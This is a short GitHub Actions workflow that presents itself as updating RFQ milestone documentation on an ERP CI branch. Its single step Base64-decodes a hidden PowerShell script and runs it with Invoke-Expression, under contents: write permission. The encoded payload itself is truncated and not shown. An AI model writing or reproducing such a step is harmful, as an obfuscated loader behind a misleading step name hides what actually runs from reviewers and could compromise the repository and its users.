name: Record RFQ milestone docs

on:
  push:
    branches:
      - erp-local-ci
    paths:
      - '.github/workflows/record-rfq-milestone.yml'

permissions:
  contents: write

jobs:
  update-docs:
    runs-on: windows-2025
    steps:
      - uses: actions/checkout@v7
        with:
          ref: erp-local-ci
      - name: Update RFQ milestone documentation
        shell: pwsh
        run: |
          $script = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('...TRUNCATED...'))
          Invoke-Expression $script
